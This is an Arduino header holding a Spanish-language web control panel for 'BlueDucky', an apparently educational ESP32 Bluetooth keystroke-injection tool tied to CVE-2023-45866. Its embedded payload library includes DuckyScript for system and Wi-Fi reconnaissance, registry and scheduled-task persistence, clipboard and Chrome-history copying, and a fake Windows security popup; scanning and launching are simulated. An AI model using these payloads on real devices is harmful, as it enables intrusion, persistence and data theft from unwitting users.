// este es el frontend basado de, sin embargo, las animaciones me ayudó la ia generativa
// https://github.com/ekv88/esp32-bluetooth-rubber-ducky/tree/main

#pragma once
#include <Arduino.h>

// me apoyé también desde https://html.onlineviewer.net/

const char PAGE_INDEX[] PROGMEM = R"rawliteral(
<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
<title>BlueDucky</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap" rel="stylesheet">

/* CSS  */
<style>
:root {
  --bg:   #020507;
  --surf: #050d0a;
  --card: #040b09;
  --g0:   #00ff88;
  --g1:   #00cc66;
  --g2:   #004d28;
  --g3:   #0a1f14;
  --c0:   #00d4ff;
  --c1:   #007a99;
  --r0:   #ff3355;
  --y0:   #ffcc00;
  --ink:  #44dd88;
  --ink2: #1e6640;
}

*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;font-family:'JetBrains Mono','Courier New',monospace;
  background:var(--bg);color:var(--ink);font-size:12px;overflow:hidden}

/* CRT scanlines */
body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9998;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,
  rgba(0,0,0,.09) 2px,rgba(0,0,0,.09) 4px)}

/* subtle vignette */
body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:9997;
  background:radial-gradient(ellipse at center,transparent 60%,rgba(0,0,0,.5) 100%)}

@keyframes blink{50%{opacity:0}}
@keyframes glitch{
  0%,89%,100%{clip-path:none;transform:none;color:var(--g0)}
  90%{clip-path:polygon(0 25%,100% 25%,100% 45%,0 45%);transform:translateX(-3px);color:var(--c0)}
  92%{clip-path:polygon(0 65%,100% 65%,100% 75%,0 75%);transform:translateX(3px)}
  94%{clip-path:none;transform:translateX(-1px)}
}
@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,255,136,.3)}50%{box-shadow:0 0 0 5px rgba(0,255,136,0)}}

/* ── HEADER ─────────────────────────────────────── */
header{height:40px;background:#010304;border-bottom:1px solid var(--g3);
  display:flex;align-items:center;justify-content:space-between;padding:0 14px;
  flex-shrink:0}
.brand{font-size:13px;font-weight:700;color:var(--g0);letter-spacing:1px;
  animation:glitch 9s infinite}
.brand em{color:var(--c0);font-style:normal}
.hpills{display:flex;gap:8px}
.pill{padding:2px 7px;border:1px solid;font-size:10px;letter-spacing:.5px}
.pill.ok{border-color:var(--g2);color:var(--g1)}
.pill.hi{border-color:var(--y0);color:var(--y0)}
.pill.targets{border-color:var(--r0);color:var(--r0)}

/* ── LAYOUT ──────────────────────────────────────── */
.wrap{display:grid;grid-template-columns:256px 1fr 290px;gap:5px;
  padding:5px;height:calc(100vh - 40px - 30px)}
.panel{background:var(--surf);border:1px solid var(--g3);
  display:flex;flex-direction:column;overflow:hidden}
.ph{padding:6px 10px;border-bottom:1px solid var(--g3);background:#030a07;
  display:flex;justify-content:space-between;align-items:center;flex-shrink:0}
.ph-title{font-size:10px;font-weight:700;letter-spacing:2px;color:var(--ink2)}
.pf{padding:6px;border-top:1px solid var(--g3);background:#030a07;
  display:flex;gap:4px;flex-wrap:wrap;flex-shrink:0}

/* scroll */
.scroll{flex:1;overflow-y:auto;padding:6px}
.scroll::-webkit-scrollbar{width:3px}
.scroll::-webkit-scrollbar-thumb{background:var(--g3)}

/* ── BUTTONS ─────────────────────────────────────── */
.btn{background:transparent;border:1px solid var(--g2);color:var(--ink);
  padding:4px 8px;font-family:inherit;font-size:10px;cursor:pointer;
  transition:background .12s,color .12s;letter-spacing:.5px}
.btn:hover{background:var(--g2);color:#000}
.btn.a{border-color:var(--g0);color:var(--g0)}.btn.a:hover{background:var(--g0);color:#000}
.btn.b{border-color:var(--c0);color:var(--c0)}.btn.b:hover{background:var(--c0);color:#000}
.btn.w{border-color:var(--y0);color:var(--y0)}.btn.w:hover{background:var(--y0);color:#000}
.btn.d{border-color:var(--r0);color:var(--r0)}.btn.d:hover{background:var(--r0);color:#000}
.btn.run{border-color:var(--r0);color:var(--r0);font-weight:700;font-size:11px;
  padding:5px 16px;animation:pulse 2.5s infinite}
.btn.run:hover{background:var(--r0);color:#fff;animation:none}

/* ── DEVICE CARDS ────────────────────────────────── */
.dev{border:1px solid var(--g3);padding:6px 8px;margin-bottom:4px;
  cursor:pointer;transition:border-color .12s,background .12s;
  animation:fadeIn .3s ease both}
.dev:hover{border-color:var(--g2);background:#070f0c}
.dev.sel{border-color:var(--g0);background:#071510}
.dev-top{display:flex;align-items:center;gap:7px;margin-bottom:3px}
.dev-chk{width:13px;height:13px;border:1px solid var(--g2);display:flex;
  align-items:center;justify-content:center;font-size:9px;color:var(--g0);flex-shrink:0}
.dev.sel .dev-chk{border-color:var(--g0);background:rgba(0,255,136,.08)}
.dev-ico{font-size:12px;color:var(--c0);min-width:18px;text-align:center}
.dev-name{color:#fff;font-weight:700;font-size:11px;flex:1;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.vuln-badge{font-size:8px;padding:1px 4px;border:1px solid var(--r0);color:var(--r0);flex-shrink:0}
.dev-meta{display:flex;justify-content:space-between;align-items:center;padding-left:20px}
.dev-mac{color:var(--ink2);font-size:10px}
.dev-right{display:flex;align-items:center;gap:7px}
.bars{display:flex;align-items:flex-end;gap:2px}
.bars span{display:block;width:4px;background:var(--g2);border-radius:1px}
.bars span:nth-child(1){height:5px}.bars span:nth-child(2){height:8px}
.bars span:nth-child(3){height:11px}.bars span:nth-child(4){height:14px}
.bars span.on{background:var(--g0)}
.dev-rssi{color:var(--g1);font-size:10px}
.dev-scanning{padding:12px;color:var(--ink2);font-size:11px;text-align:center}

/* ── TABS ────────────────────────────────────────── */
.tabs{display:flex;border-bottom:1px solid var(--g3);background:#030a07;flex-shrink:0}
.tab{padding:7px 12px;font-size:10px;font-family:inherit;background:none;
  border:none;border-right:1px solid var(--g3);color:var(--ink2);
  cursor:pointer;transition:color .12s;letter-spacing:1px}
.tab:hover{color:var(--ink)}
.tab.on{color:var(--g0);border-bottom:1px solid var(--g0);background:#040e09}
.tab-wrap{flex:1;overflow:hidden;display:flex;flex-direction:column}
.tab-pane{display:none;flex-direction:column;flex:1;overflow:hidden}
.tab-pane.on{display:flex}

/* ── PAYLOAD LIBRARY ─────────────────────────────── */
.cat-lbl{font-size:10px;font-weight:700;letter-spacing:2px;
  padding-bottom:4px;border-bottom:1px dashed var(--g3);margin-bottom:5px;margin-top:8px}
.cat-lbl:first-child{margin-top:0}
.pl-item{display:flex;align-items:center;border:1px solid var(--g3);
  padding:5px 7px;margin-bottom:3px;cursor:pointer;transition:all .12s;gap:8px}
.pl-item:hover{border-color:var(--g2);background:#060f0b}
.pl-item.on{border-color:var(--g0);background:#071510}
.pl-body{flex:1;min-width:0}
.pl-name{color:#fff;font-size:11px;margin-bottom:2px}
.pl-desc{color:var(--ink2);font-size:10px}
.pl-tags{display:flex;gap:3px;margin-top:3px;flex-wrap:wrap}
.tag{font-size:9px;padding:1px 4px;border:1px solid var(--g3);color:var(--ink2)}
.pl-use{font-size:9px;padding:3px 6px;border:1px solid var(--g1);color:var(--g1);
  background:none;cursor:pointer;font-family:inherit;flex-shrink:0}
.pl-use:hover{background:var(--g1);color:#000}

/* ── STEP BUILDER ────────────────────────────────── */
.step{display:flex;align-items:center;gap:6px;border:1px solid var(--g3);
  padding:5px 7px;margin-bottom:3px;background:#000;
  animation:fadeIn .2s ease both}
.step-t{color:var(--c0);font-size:10px;min-width:56px;flex-shrink:0}
.step input,.step select{flex:1;background:#000;color:var(--ink);
  border:1px solid var(--g2);padding:3px 5px;font-family:inherit;font-size:11px}
.step input:focus,.step select:focus{outline:none;border-color:var(--g0)}
.kill{background:none;border:none;color:var(--r0);cursor:pointer;font-size:13px;flex-shrink:0}

/* ── RAW EDITOR ──────────────────────────────────── */
textarea.raw{flex:1;background:#000;color:var(--g0);border:none;
  padding:10px;font-family:'JetBrains Mono',monospace;font-size:12px;
  resize:none;outline:none;line-height:1.6}
textarea.raw::selection{background:rgba(0,255,136,.2)}

/* ── SD FILE LIST ────────────────────────────────── */
.sd-bar{color:var(--ink2);font-size:10px;padding:6px 6px 4px;border-bottom:1px dashed var(--g3);margin-bottom:4px}
.file{display:flex;align-items:center;gap:7px;padding:4px 6px;cursor:pointer}
.file:hover{background:#060f0b}
.file-ico{color:var(--y0)}
.file-nm{color:var(--ink);font-size:11px;flex:1}
.file-sz{color:var(--ink2);font-size:10px}

/* ── LAUNCH BAR ──────────────────────────────────── */
.launch-bar{padding:6px 10px;border-top:1px solid var(--g3);background:#030a07;
  display:flex;justify-content:space-between;align-items:center;flex-shrink:0}
.launch-info{font-size:10px;color:var(--ink2)}
.launch-info span{color:var(--y0)}

/* ── CONSOLE ─────────────────────────────────────── */
.log-pane{flex:1;overflow-y:auto;padding:8px;font-size:11px}
.log-pane::-webkit-scrollbar{width:3px}
.log-pane::-webkit-scrollbar-thumb{background:var(--g3)}
.ll{margin-bottom:3px;line-height:1.5}
.ll.sys{color:var(--c0)}.ll.ok{color:var(--g0)}.ll.warn{color:var(--y0)}
.ll.err{color:var(--r0)}.ll.dim{color:var(--ink2)}.ll.info{color:var(--ink)}
.ll-t{color:var(--g3)}
.cursor{display:inline-block;width:7px;height:12px;background:var(--g0);
  vertical-align:middle;animation:blink 1s step-end infinite}

/* ── FOOTER ──────────────────────────────────────── */
footer{height:30px;background:#010304;border-top:1px solid var(--g3);
  display:flex;align-items:center;justify-content:space-between;
  padding:0 12px;font-size:10px;color:var(--ink2);flex-shrink:0}
.fstatus{color:var(--g0)}

/* ── MATRIX OVERLAY ──────────────────────────────── */
#matOv{display:none;position:fixed;inset:0;z-index:10000;
  background:#000;cursor:pointer;align-items:center;justify-content:center}
#matCv{position:absolute;inset:0}
.mat-msg{position:relative;z-index:1;text-align:center;pointer-events:none}
.mat-tgt{color:var(--c0);font-size:13px;letter-spacing:1px;margin-bottom:16px;
  opacity:0;transition:opacity .6s}
.mat-tgt.v{opacity:1}
.mat-h{font-size:30px;font-weight:700;color:var(--g0);letter-spacing:4px;
  text-shadow:0 0 20px var(--g0),0 0 60px rgba(0,255,136,.4);
  opacity:0;transition:opacity .8s}
.mat-h.v{opacity:1}
.mat-sub{color:var(--ink2);font-size:11px;margin-top:14px;letter-spacing:2px;
  opacity:0;transition:opacity .6s .4s}
.mat-sub.v{opacity:1}
</style>
</head>
<body>

<!-- HEADER -->
<header>
  <div class="brand">BLUE<em>DUCKY</em> <span style="color:var(--ink2);font-weight:300;font-size:11px"> | RubberDAB | FEI Pentesting</span></div>
  <div class="hpills">
    <span class="pill ok">BT: ON</span>
    <span class="pill ok" id="sdPill">SD: OK</span>
    <span class="pill hi">AP: 192.168.4.1</span>
    <span class="pill" id="tgtPill">TARGETS: 0</span>
  </div>
</header>

<!-- MAIN -->
<main class="wrap">

  <!-- ── mostrar dispositivos Bluetooth a la izquierda ── -->
  <div class="panel">
    <div class="ph">
      <span class="ph-title">BT SCAN</span>
      <span style="color:var(--ink2);font-size:10px" id="devCount">0 found</span>
    </div>
    <div class="scroll" id="devList"></div>
    <div class="pf">
      <button class="btn a" onclick="scanDevices()">[RE-SCAN]</button>
      <button class="btn b" onclick="selectAll()">ALL</button>
      <button class="btn" onclick="clearSel()">CLEAR</button>
      <button class="btn" onclick="logDevices()">INFO</button>
    </div>
  </div>

  <!-- ── CENTER: PAYLOAD MANAGER ── -->
  <div class="panel">
    <div class="tabs">
      <button class="tab on" onclick="openTab('lib',this)">LIBRARY</button>
      <button class="tab" onclick="openTab('bld',this)">BUILDER</button>
      <button class="tab" onclick="openTab('raw',this)">RAW</button>
      <button class="tab" onclick="openTab('sd',this)">SD CARD</button>
    </div>

    <div class="tab-wrap">

      <!-- Library -->
      <div class="tab-pane on" id="tab-lib">
        <div class="scroll" id="libBody"></div>
      </div>

      <!-- Builder -->
      <div class="tab-pane" id="tab-bld">
        <div class="scroll" id="stepsArea"></div>
        <div class="pf">
          <button class="btn" onclick="addStep('WAIT')">+WAIT</button>
          <button class="btn" onclick="addStep('STRING')">+STRING</button>
          <button class="btn" onclick="addStep('KEY')">+KEY</button>
          <button class="btn" onclick="addStep('REM')">+REM</button>
          <button class="btn b" onclick="toRaw()">→ RAW</button>
          <button class="btn a" onclick="saveSD()">SAVE SD</button>
        </div>
      </div>

      <!-- Raw -->
      <div class="tab-pane" id="tab-raw">
        <textarea class="raw" id="rawEd" spellcheck="false">REM BlueDucky Payload
DELAY 500
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 500
STRING echo BlueDucky Connected
ENTER</textarea>
        <div class="pf">
          <button class="btn" onclick="toBuilder()">→ BUILDER</button>
          <button class="btn a" onclick="saveSD()">SAVE SD</button>
          <button class="btn d" onclick="clearAll()">CLEAR</button>
        </div>
      </div>

      <!-- SD Card -->
      <div class="tab-pane" id="tab-sd">
        <div class="scroll">
          <div class="sd-bar">/payloads/ — 4 files — 3.8 KB free: 14.2 GB</div>
          <div class="file"><span class="file-ico">[D]</span><span class="file-nm">payloads/</span></div>
          <div class="file" onclick="loadFromSD('sysinfo')"><span class="file-ico">[F]</span><span class="file-nm">sysinfo.txt</span><span class="file-sz">1.2 KB</span></div>
          <div class="file" onclick="loadFromSD('wifi')"><span class="file-ico">[F]</span><span class="file-nm">wifi_grab.txt</span><span class="file-sz">0.8 KB</span></div>
          <div class="file" onclick="loadFromSD('custom')"><span class="file-ico">[F]</span><span class="file-nm">custom_01.txt</span><span class="file-sz">0.5 KB</span></div>
          <div class="file" onclick="loadFromSD('lockscreen')"><span class="file-ico">[F]</span><span class="file-nm">lockscreen.txt</span><span class="file-sz">0.3 KB</span></div>
          <div style="padding:8px 6px;color:var(--ink2);font-size:10px;border-top:1px dashed var(--g3);margin-top:6px">
            Click en un archivo para cargarlo en el editor
          </div>
        </div>
        <div class="pf">
          <button class="btn a" onclick="saveSD()">GUARDAR ACTUAL</button>
          <button class="btn d" onclick="log_('SD formatear? (no implementado)','warn')">FORMAT</button>
        </div>
      </div>

    </div><!-- tab-wrap -->

    <!-- LAUNCH BAR -->
    <div class="launch-bar">
      <div class="launch-info">PAYLOAD: <span id="activePayload">sin cargar</span></div>
      <button class="btn run" onclick="launch()">▶ LANZAR RUN</button>
    </div>
  </div>

  <!-- ── RIGHT: CONSOLE ── -->
  <div class="panel">
    <div class="ph">
      <span class="ph-title">CONSOLE</span>
      <span class="cursor"></span>
    </div>
    <div class="log-pane" id="logPane"></div>
    <div class="pf">
      <button class="btn d" onclick="clearLog()">CLEAR</button>
      <button class="btn" onclick="exportLog()">EXPORT</button>
    </div>
  </div>

</main>

<!-- FOOTER -->
<footer>
  <span>CVE-2023-45866 | HID BT INJECTION | FEI PENTESTING LAB</span>
  <span class="fstatus" id="fStat">SISTEMA LISTO</span>
</footer>

<!-- MATRIX OVERLAY -->
<div id="matOv" onclick="closeMatrix()">
  <canvas id="matCv"></canvas>
  <div class="mat-msg">
    <div class="mat-tgt" id="matTgt"></div>
    <div class="mat-h" id="matH">[ PAYLOAD DEPLOYED ]</div>
    <div class="mat-sub" id="matSub">CLICK PARA CERRAR</div>
  </div>
</div>

<script>
// ── DATA ────────────────────────────────────────────────────────────────
const DEVICES = [
  {name:'iPhone de Fer',   mac:'A4:C3:F0:12:34:56', ico:'[M]', rssi:-58, vuln:true},
  {name:'LAPTOP-HP-8B2A', mac:'DC:A6:32:AB:CD:EF', ico:'[L]', rssi:-72, vuln:true},
  {name:'JBL Flip 6',     mac:'88:C6:26:11:22:33', ico:'[A]', rssi:-81, vuln:false},
  {name:'POCO X6 Pro',    mac:'E8:9F:6D:44:55:66', ico:'[M]', rssi:-65, vuln:true},
  {name:'MacBook Pro M3', mac:'3C:22:FB:77:88:99', ico:'[L]', rssi:-69, vuln:false},
];

const PAYLOADS = {
  RECON:[
    {id:'r1',name:'System Info Dump',desc:'systeminfo completo via CMD',tags:['win','cmd'],
     script:'REM System Info\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd /k systeminfo\nENTER'},
    {id:'r2',name:'WiFi Credentials',desc:'Lista perfiles WiFi guardados',tags:['win','creds'],
     script:'REM WiFi Creds\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING netsh wlan show profiles\nENTER'},
    {id:'r3',name:'Net + ARP Scan',desc:'ipconfig, ARP table, DNS cache',tags:['win','network'],
     script:'REM Net Recon\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING ipconfig /all\nENTER\nDELAY 300\nSTRING arp -a\nENTER'},
  ],
  PERSIST:[
    {id:'p1',name:'Scheduled Task',desc:'Crea tarea diaria en Task Scheduler',tags:['win','persist'],
     script:'REM Sched Task\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING schtasks /create /tn "SysUpdate" /tr calc.exe /sc daily /f\nENTER'},
    {id:'p2',name:'Registry Startup',desc:'Entrada en HKCU\\Run',tags:['win','registry'],
     script:'REM Registry\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysCheck /t REG_SZ /d calc.exe /f\nENTER'},
  ],
  EXFIL:[
    {id:'e1',name:'Clipboard Grab',desc:'Captura portapapeles a archivo temp',tags:['win','ps'],
     script:'REM Clipboard\nDELAY 500\nGUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 500\nSTRING Get-Clipboard | Out-File $env:TEMP\\cb.txt\nENTER'},
    {id:'e2',name:'Chrome History',desc:'Copia historial de Chrome',tags:['win','browser'],
     script:'REM Chrome\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" %TEMP%\\hist.db\nENTER'},
  ],
  SOCIAL:[
    {id:'s1',name:'Fake Update Alert',desc:'Popup de actualización falsa',tags:['win','ui'],
     script:'REM Fake Alert\nDELAY 500\nGUI r\nDELAY 400\nSTRING powershell -WindowStyle Hidden -Command "[System.Windows.Forms.MessageBox]::Show(\'Critical update required\',\'Windows Security\')"\nENTER'},
    {id:'s2',name:'Lock Screen',desc:'Bloquea la sesión inmediatamente',tags:['win','lock'],
     script:'REM Lock\nDELAY 500\nGUI l'},
  ],
};

const CAT_CLR = {RECON:'#00d4ff',PERSIST:'#ffcc00',EXFIL:'#ff9933',SOCIAL:'#cc66ff'};

let selectedDev = new Set();
let activeId = null;
let matIv = null;

// ── UTILS ────────────────────────────────────────────────────────────────
function rssi2bars(v){if(v>=-60)return 4;if(v>=-70)return 3;if(v>=-80)return 2;return 1}

function log_(msg,type='info'){
  const pane=document.getElementById('logPane');
  const now=new Date().toTimeString().slice(0,8);
  const d=document.createElement('div');
  d.className='ll '+type;
  d.innerHTML=`<span class="ll-t">[${now}]</span> ${msg}`;
  pane.appendChild(d);
  pane.scrollTop=pane.scrollHeight;
  document.getElementById('fStat').textContent=msg.replace(/<[^>]+>/g,'').slice(0,55);
}

function setFooter(t){document.getElementById('fStat').textContent=t}

// ── DEVICES ──────────────────────────────────────────────────────────────
function renderDevices(list){
  const el=document.getElementById('devList');
  el.innerHTML='';
  list.forEach((d,i)=>{
    const b=rssi2bars(d.rssi);
    const bars=[1,2,3,4].map(n=>`<span class="${n<=b?'on':''}"></span>`).join('');
    const div=document.createElement('div');
    div.className='dev'+(selectedDev.has(i)?' sel':'');
    div.onclick=()=>toggleDev(i,div,d);
    div.innerHTML=`
      <div class="dev-top">
        <div class="dev-chk">${selectedDev.has(i)?'✓':''}</div>
        <div class="dev-ico">${d.ico}</div>
        <div class="dev-name">${d.name}</div>
        ${d.vuln?'<div class="vuln-badge">CVE OK</div>':''}
      </div>
      <div class="dev-meta">
        <span class="dev-mac">${d.mac}</span>
        <div class="dev-right">
          <div class="bars">${bars}</div>
          <span class="dev-rssi">${d.rssi}dBm</span>
        </div>
      </div>`;
    el.appendChild(div);
  });
  document.getElementById('devCount').textContent=list.length+' found';
  updateTgt();
}

function toggleDev(i,el,d){
  if(selectedDev.has(i)){
    selectedDev.delete(i);
    log_(`Target removido: ${d.name}`,'dim');
  } else {
    selectedDev.add(i);
    log_(`<span style="color:var(--r0)">Target seleccionado:</span> ${d.name} ${d.mac}`,'warn');
  }
  renderDevices(DEVICES);
}

function updateTgt(){
  const n=selectedDev.size;
  const pill=document.getElementById('tgtPill');
  pill.textContent='TARGETS: '+n;
  pill.className='pill'+(n>0?' targets':'');
}

function selectAll(){
  DEVICES.forEach((_,i)=>selectedDev.add(i));
  renderDevices(DEVICES);
  log_('Todos los dispositivos marcados como target','warn');
}

function clearSel(){
  selectedDev.clear();
  renderDevices(DEVICES);
  log_('Selección limpiada','dim');
}

function scanDevices(){
  log_('[BT] Iniciando escaneo Bluetooth...','sys');
  document.getElementById('devList').innerHTML='<div class="dev-scanning">[SCANNING...]</div>';
  setTimeout(()=>{
    const sh=[...DEVICES].sort(()=>Math.random()-.5);
    renderDevices(sh);
    log_(`[BT] ${sh.length} dispositivos encontrados`,'ok');
  },1800);
}

function logDevices(){
  log_('── Dispositivos encontrados ──','sys');
  DEVICES.forEach(d=>{
    log_(`${d.ico} ${d.name} | ${d.mac} | ${d.rssi}dBm | CVE:${d.vuln?'✓':'✗'}`,d.vuln?'warn':'dim');
  });
}

// ── TABS ─────────────────────────────────────────────────────────────────
function openTab(id,btn){
  document.querySelectorAll('.tab-pane').forEach(p=>{p.classList.remove('on')});
  document.querySelectorAll('.tab').forEach(t=>{t.classList.remove('on')});
  document.getElementById('tab-'+id).classList.add('on');
  btn.classList.add('on');
}

// ── LIBRARY ──────────────────────────────────────────────────────────────
function renderLib(){
  const el=document.getElementById('libBody');
  el.innerHTML='';
  Object.entries(PAYLOADS).forEach(([cat,items])=>{
    const catDiv=document.createElement('div');
    catDiv.innerHTML=`<div class="cat-lbl" style="color:${CAT_CLR[cat]}">${cat}</div>`;
    items.forEach(p=>{
      const tags=p.tags.map(t=>`<span class="tag">${t}</span>`).join('');
      const row=document.createElement('div');
      row.className='pl-item'+(activeId===p.id?' on':'');
      row.innerHTML=`
        <div class="pl-body">
          <div class="pl-name">${p.name}</div>
          <div class="pl-desc">${p.desc}</div>
          <div class="pl-tags">${tags}</div>
        </div>
        <button class="pl-use" onclick="usePayload('${p.id}','${cat}',event)">USAR</button>`;
      catDiv.appendChild(row);
    });
    el.appendChild(catDiv);
  });
}

function usePayload(id,cat,e){
  if(e){e.stopPropagation()}
  let found=null;
  Object.values(PAYLOADS).flat().forEach(p=>{if(p.id===id)found=p});
  if(!found)return;
  activeId=id;
  document.getElementById('rawEd').value=found.script;
  document.getElementById('activePayload').textContent=found.name;
  renderLib();
  toBuilder();
  log_(`Payload cargado: [${cat}] ${found.name}`,'ok');
}

function loadFromSD(name){
  const scripts={
    sysinfo:'REM SysInfo\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd /k systeminfo\nENTER',
    wifi:'REM WiFi\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING netsh wlan show profiles\nENTER',
    custom:'REM Custom 01\nDELAY 500\nSTRING echo hola mundo\nENTER',
    lockscreen:'REM Lock\nDELAY 500\nGUI l',
  };
  if(scripts[name]){
    document.getElementById('rawEd').value=scripts[name];
    document.getElementById('activePayload').textContent=name+'.txt';
    log_(`[SD] Cargado: ${name}.txt`,'ok');
    toBuilder();
  }
}

// ── BUILDER ──────────────────────────────────────────────────────────────
function addStep(tipo,val=''){
  const area=document.getElementById('stepsArea');
  const div=document.createElement('div');
  div.className='step';
  let inner='';
  if(tipo==='WAIT'){
    inner=`<input type="number" value="${val||500}" style="max-width:90px"><span style="color:var(--ink2);margin-left:3px">ms</span>`;
  } else if(tipo==='STRING'){
    inner=`<input type="text" value="${val||''}" placeholder="texto a escribir...">`;
  } else if(tipo==='KEY'){
    const KS=['ENTER','GUI r','GUI l','TAB','ESCAPE','SPACE','CTRL+c','CTRL+v','CTRL+z','ALT+F4'];
    inner=`<select>${KS.map(k=>`<option value="${k}" ${val===k?'selected':''}>${k}</option>`).join('')}</select>`;
  } else if(tipo==='REM'){
    inner=`<input type="text" value="${val||''}" placeholder="comentario..." style="color:var(--ink2)">`;
  }
  div.innerHTML=`<span class="step-t">[${tipo}]</span>${inner}<button class="kill" onclick="this.parentElement.remove()">✕</button>`;
  area.appendChild(div);
}

function toBuilder(){
  const area=document.getElementById('stepsArea');
  area.innerHTML='';
  document.getElementById('rawEd').value.split('\n').forEach(l=>{
    l=l.trim();if(!l)return;
    if(l.startsWith('REM'))addStep('REM',l.replace(/^REM\s*/,''));
    else if(l.startsWith('DELAY'))addStep('WAIT',l.replace(/^DELAY\s*/,''));
    else if(l.startsWith('STRING'))addStep('STRING',l.replace(/^STRING\s*/,''));
    else if(['ENTER','GUI r','GUI l','GUI R','GUI L'].includes(l))addStep('KEY',l);
  });
  openTab('bld',document.querySelectorAll('.tab')[1]);
}

function toRaw(){
  const blocks=document.querySelectorAll('#stepsArea .step');
  let r='';
  blocks.forEach(b=>{
    const t=b.querySelector('.step-t').textContent.replace(/[\[\]]/g,'');
    const v=b.querySelector('input,select')?.value||'';
    if(t==='WAIT')r+=`DELAY ${v}\n`;
    else if(t==='STRING')r+=`STRING ${v}\n`;
    else if(t==='KEY')r+=`${v}\n`;
    else if(t==='REM')r+=`REM ${v}\n`;
  });
  document.getElementById('rawEd').value=r.trim();
  openTab('raw',document.querySelectorAll('.tab')[2]);
}

function clearAll(){
  document.getElementById('rawEd').value='';
  document.getElementById('stepsArea').innerHTML='';
  document.getElementById('activePayload').textContent='sin cargar';
  activeId=null;renderLib();
  log_('Editor limpiado','dim');
}

async function saveSD(){
  log_('[SD] Guardando payload en MicroSD...','sys');
  setTimeout(()=>log_('[SD] ✓ Guardado exitosamente','ok'),600);
  // fetch('/api/save',{method:'POST',body:document.getElementById('rawEd').value})
}

function exportLog(){
  const txt=[...document.querySelectorAll('.ll')].map(l=>l.textContent).join('\n');
  const a=document.createElement('a');
  a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(txt);
  a.download='blueducky_log.txt';a.click();
}

function clearLog(){document.getElementById('logPane').innerHTML=''}

// ── LAUNCH & MATRIX ───────────────────────────────────────────────────────
function launch(){
  if(!selectedDev.size){log_('[!] Selecciona al menos un target','err');return}
  const raw=document.getElementById('rawEd').value.trim();
  if(!raw){log_('[!] No hay payload cargado — carga uno desde LIBRARY','err');return}
  const names=[...selectedDev].map(i=>DEVICES[i].name).join(' | ');
  log_(`[RUN] Iniciando inyección HID Bluetooth...`,'sys');
  log_(`[RUN] Targets: ${names}`,'warn');
  log_(`[BT] CVE-2023-45866 exploit enviando...`,'err');
  showMatrix(names);
  // fetch('/api/run',{method:'POST'})
}

function showMatrix(targets){
  const ov=document.getElementById('matOv');
  const cv=document.getElementById('matCv');
  ov.style.display='flex';
  cv.width=window.innerWidth; cv.height=window.innerHeight;
  const ctx=cv.getContext('2d');
  const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*!?><{}アイウエオカキクケコサシスセソタチツテトナニヌネノ';
  const fs=13, cols=Math.floor(cv.width/fs);
  const drops=Array.from({length:cols},()=>Math.random()*-60);

  const tgt=document.getElementById('matTgt');
  const h=document.getElementById('matH');
  const sub=document.getElementById('matSub');
  tgt.textContent='>>> TARGET: '+targets+' <<<';
  [tgt,h,sub].forEach(e=>e.classList.remove('v'));

  if(matIv)clearInterval(matIv);
  let frame=0;
  matIv=setInterval(()=>{
    ctx.fillStyle='rgba(0,0,0,.06)';
    ctx.fillRect(0,0,cv.width,cv.height);
    ctx.font=fs+'px "JetBrains Mono",monospace';
    for(let i=0;i<drops.length;i++){
      const c=chars[Math.floor(Math.random()*chars.length)];
      ctx.fillStyle=Math.random()>.93?'#ffffff':'#00ff88';
      ctx.fillText(c,i*fs,drops[i]*fs);
      drops[i]++;
      if(drops[i]*fs>cv.height&&Math.random()>.975)drops[i]=Math.random()*-30;
    }
    frame++;
    if(frame===30)tgt.classList.add('v');
    if(frame===70)h.classList.add('v');
    if(frame===110)sub.classList.add('v');
  },28);
}

function closeMatrix(){
  if(matIv){clearInterval(matIv);matIv=null}
  document.getElementById('matOv').style.display='none';
  log_('[RUN] Secuencia completada — payload ejecutado','ok');
  setFooter('PAYLOAD EJECUTADO');
}

// ── INIT ──────────────────────────────────────────────────────────────────
renderDevices(DEVICES);
renderLib();
log_('BlueDucky inicializado','sys');
log_('CVE-2023-45866 HID injection engine <span style="color:var(--g0)">READY</span>','ok');
log_('AP mode activo — ','info');
log_('','ok');
log_('Esperando selección de targets...','dim');
toBuilder();
</script>
</body>
</html>

)rawliteral";